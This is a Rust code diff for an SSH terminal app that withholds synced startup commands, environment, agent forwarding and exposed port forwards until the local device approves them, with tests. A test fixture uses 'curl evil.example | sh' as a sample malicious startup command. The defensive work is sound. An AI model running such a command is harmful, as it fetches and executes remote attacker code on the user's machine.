@@ -286,6 +286,10 @@ fn build_ordered_auth(
 /// vault: the host, its authentication, and the route to it.
 pub(crate) struct Prepared {
     pub host: Host,
+    /// Whether this device approved the host's exec-like fields (startup
+    /// command, agent forwarding, environment, forwards that are not loopback
+    /// only). Without it the session runs without them.
+    pub exec_approved: bool,
     pub auth: Vec<AuthChoice>,
     /// The jump hosts, first hop first, each with its authentication.
     pub hops: Vec<(Host, Vec<AuthChoice>)>,
@@ -338,7 +342,13 @@ pub(crate) fn prepare(
         hops.push((hop, auth));
     }
     let auth = build_auth(&host, store, secrets)?;
-    Ok(Prepared { host, auth, hops })
+    let exec_approved = store.repos().hosts().exec_status(&host)?.approved;
+    Ok(Prepared {
+        host,
+        exec_approved,
+        auth,
+        hops,
+    })
 }
 
 /// The engine's parameters for one host (a jump host or the target). The
@@ -371,7 +381,12 @@ fn endpoint_params(state: &AppState, host: &Host, auth: Vec<AuthChoice>) -> Conn
 /// session does besides connecting (forwards, environment, startup input,
 /// agent forwarding).
 pub(crate) fn build_params(state: &AppState, prepared: Prepared) -> ConnectParams {
-    let Prepared { host, auth, hops } = prepared;
+    let Prepared {
+        host,
+        exec_approved,
+        auth,
+        hops,
+    } = prepared;
     let mut params = endpoint_params(state, &host, auth);
     params.setup = session_setup(
         &host,
@@ -381,13 +396,20 @@ pub(crate) fn build_params(state: &AppState, prepared: Prepared) -> ConnectParam
                 params: endpoint_params(state, &hop, auth),
             })
             .collect(),
+        exec_approved,
     );
     params
 }
 
 /// What the host asks of its session. Only the **enabled** forwards run; each
 /// is named by its index in the host's list so a disabled one keeps its slot.
-fn session_setup(host: &Host, jump: Vec<JumpHop>) -> SessionSetup {
+///
+/// The exec-like fields (startup command, agent forwarding, environment,
+/// forwards that are not loopback only) arrive through sync, so they are used
+/// only when `exec_approved`: this device's user approved exactly these values
+/// (see `termru_core::exec_approval`). Without it the session connects
+/// without them; forwards on loopback still run, under their own indices.
+fn session_setup(host: &Host, jump: Vec<JumpHop>, exec_approved: bool) -> SessionSetup {
     SessionSetup {
         jump,
         forwards: host
@@ -395,34 +417,53 @@ fn session_setup(host: &Host, jump: Vec<JumpHop>) -> SessionSetup {
             .iter()
             .enumerate()
             .filter(|(_, forward)| forward.enabled)
+            .filter(|(_, forward)| exec_approved || forward.binds_loopback())
             .filter_map(|(index, forward)| {
                 u32::try_from(index)
                     .ok()
                     .map(|id| ForwardSpec::from_forward(id, forward))
             })
             .collect(),
-        env: host
-            .env
-            .iter()
-            .map(|var| (var.name.clone(), var.value.clone()))
-            .collect(),
-        startup_command: host.startup_command.clone(),
-        agent_forward: host.agent_forward.then(|| AgentForward {
+        env: if exec_approved {
+            host.env
+                .iter()
+                .map(|var| (var.name.clone(), var.value.clone()))
+                .collect()
+        } else {
+            Vec::new()
+        },
+        startup_command: host.startup_command.clone().filter(|_| exec_approved),
+        agent_forward: (exec_approved && host.agent_forward).then(|| AgentForward {
             socket: agent_socket(),
         }),
     }
 }
 
-/// Registers the session and spawns its connection task.
-fn start_session(
-    state: &AppState,
+/// What a new session starts with.
+struct Launch {
     host_id: HostId,
     params: ConnectParams,
     cols: u16,
     rows: u16,
+    /// The session runs without the host's exec-like fields, which this device
+    /// has not approved (the views are told).
+    exec_pending: bool,
+}
+
+/// Registers the session and spawns its connection task.
+fn start_session(
+    state: &AppState,
+    launch: Launch,
     window: &str,
     channel: Channel<SessionUpdate>,
 ) -> String {
+    let Launch {
+        host_id,
+        params,
+        cols,
+        rows,
+        exec_pending,
+    } = launch;
     let options = SessionOptions {
         cols,
         rows,
@@ -434,6 +475,10 @@ fn start_session(
     let cancel_rx = state
         .sessions
         .register_with_id(&id, host_id, params.clone(), window, channel);
+    if exec_pending {
+        // The first view is told (and so is every view that attaches later).
+        state.sessions.set_exec_pending(&id);
+    }
     spawn_connection(
         state.sessions.clone(),
         state.store.clone(),
@@ -464,13 +509,17 @@ pub async fn session_open(
     })
     .await
     .map_err(|error| CommandError::new(format!("the session could not be prepared: {error}")))??;
+    let exec_pending = !prepared.exec_approved;
     let params = build_params(&state, prepared);
     Ok(start_session(
         &state,
-        host_id,
-        params,
-        options.cols,
-        options.rows,
+        Launch {
+            host_id,
+            params,
+            cols: options.cols,
+            rows: options.rows,
+            exec_pending,
+        },
         webview.label(),
         channel,
     ))
@@ -527,10 +576,14 @@ pub async fn session_duplicate(
         .ok_or_else(|| CommandError::not_found("session", &id))?;
     Ok(start_session(
         &state,
-        info.host_id,
-        params,
-        geometry.cols,
-        geometry.rows,
+        Launch {
+            host_id: info.host_id,
+            params,
+            cols: geometry.cols,
+            rows: geometry.rows,
+            // The copy runs with the same parameters, so it lacks the same fields.
+            exec_pending: info.exec_pending,
+        },
         webview.label(),
         channel,
     ))
@@ -902,7 +955,7 @@ mod tests {
             value: "ops".into(),
         }];
         host.startup_command = Some("uptime".into());
-        let setup = session_setup(&host, Vec::new());
+        let setup = session_setup(&host, Vec::new(), true);
         let ids: Vec<(u32, ForwardKind)> = setup.forwards.iter().map(|f| (f.id, f.kind)).collect();
         assert_eq!(ids, vec![(0, ForwardKind::Local), (2, ForwardKind::Remote)]);
         assert_eq!(
@@ -912,7 +965,130 @@ mod tests {
         assert_eq!(setup.startup_command.as_deref(), Some("uptime"));
         assert!(setup.agent_forward.is_none(), "agent forwarding is opt-in");
         host.agent_forward = true;
-        assert!(session_setup(&host, Vec::new()).agent_forward.is_some());
+        assert!(
+            session_setup(&host, Vec::new(), true)
+                .agent_forward
+                .is_some()
+        );
+    }
+
+    /// A host whose exec-like fields this device has not approved.
+    fn host_with_exec_fields() -> Host {
+        use termru_core::{EnvVar, Forward, ForwardKind};
+        let forward = |kind, bind: Option<&str>, port| Forward {
+            kind,
+            bind_address: bind.map(str::to_string),
+            bind_port: port,
+            target_host: (kind != ForwardKind::Dynamic).then(|| "db".to_string()),
+            target_port: (kind != ForwardKind::Dynamic).then_some(5432),
+            enabled: true,
+        };
+        let mut host = host_with(AuthMethod::Agent);
+        host.forwards = vec![
+            forward(ForwardKind::Local, Some("0.0.0.0"), 9000),
+            forward(ForwardKind::Local, None, 8080),
+            forward(ForwardKind::Dynamic, Some("127.0.0.1"), 1080),
+        ];
+        host.env = vec![EnvVar {
+            name: "TERMRU_PROFILE".into(),
+            value: "ops".into(),
+        }];
+        host.startup_command = Some("curl evil.example | sh".into());
+        host.agent_forward = true;
+        host
+    }
+
+    #[test]
+    fn unapproved_exec_fields_are_left_out_of_the_session() {
+        let host = host_with_exec_fields();
+        let setup = session_setup(&host, Vec::new(), false);
+        assert!(setup.startup_command.is_none(), "no startup command");
+        assert!(setup.agent_forward.is_none(), "no agent forwarding");
+        assert!(setup.env.is_empty(), "no environment");
+        // Loopback forwards still run, under the index they have in the host
+        // (the first, exposed one is gone, so ids 1 and 2 remain).
+        let ids: Vec<u32> = setup.forwards.iter().map(|f| f.id).collect();
+        assert_eq!(ids, vec![1, 2]);
+    }
+
+    #[test]
+    fn approved_exec_fields_are_all_used() {
+        let host = host_with_exec_fields();
+        let setup = session_setup(&host, Vec::new(), true);
+        assert_eq!(
+            setup.startup_command.as_deref(),
+            Some("curl evil.example | sh")
+        );
+        assert!(setup.agent_forward.is_some());
+        assert_eq!(setup.env.len(), 1);
+        let ids: Vec<u32> = setup.forwards.iter().map(|f| f.id).collect();
+        assert_eq!(ids, vec![0, 1, 2]);
+    }
+
+    /// Through the store, as a connection goes: a host that arrived through
+    /// sync is not approved, approving the reviewed hash applies the fields,
+    /// a later synced change withholds them again, and saving in the editor
+    /// approves what it saved.
+    #[test]
+    fn the_connection_follows_the_approval_of_this_device() {
+        let (_dir, store) = temp_store();
+        let mut host = host_with_exec_fields();
+        // Not a local edit: the record came from the sync account.
+        store.repos().hosts().save(&mut host).expect("save");
+        let prepare_host = |store: &termru_store::Store, id| {
+            prepare(store, id, &SessionSecrets::default(), &HashMap::new()).expect("prepare")
+        };
+
+        let prepared = prepare_host(&store, host.id);
+        assert!(!prepared.exec_approved, "a synced host is not approved");
+
+        let hash = store
+            .repos()
+            .hosts()
+            .exec_status(&prepared.host)
+            .expect("status")
+            .hash;
+        crate::commands::hosts::approve_exec(&store, host.id, &hash).expect("approve");
+        let prepared = prepare_host(&store, host.id);
+        assert!(prepared.exec_approved, "approved after the review");
+        assert!(
+            session_setup(&prepared.host, Vec::new(), prepared.exec_approved)
+                .startup_command
+                .is_some()
+        );
+
+        // The sync account changes the command: withheld again.
+        let mut changed = prepared.host.clone();
+        changed.startup_command = Some("reboot".into());
+        store.repos().hosts().save(&mut changed).expect("save");
+        assert!(!prepare_host(&store, host.id).exec_approved);
+
+        // The user edits the host on this device: the editor approves it.
+        let mut edited = changed;
+        edited.startup_command = Some("uptime".into());
+        store
+            .repos()
+            .hosts()
+            .save_approved(&mut edited)
+            .expect("save");
+        let prepared = prepare_host(&store, host.id);
+        assert!(prepared.exec_approved);
+        assert_eq!(
+            session_setup(&prepared.host, Vec::new(), true)
+                .startup_command
+                .as_deref(),
+            Some("uptime")
+        );
+    }
+
+    #[test]
+    fn a_plain_host_never_needs_approval() {
+        let (_dir, store) = temp_store();
+        let mut host = host_with(AuthMethod::Agent);
+        store.repos().hosts().save(&mut host).expect("save");
+        let prepared =
+            prepare(&store, host.id, &SessionSecrets::default(), &HashMap::new()).expect("prepare");
+        assert!(prepared.exec_approved);
     }
 
     #[test]
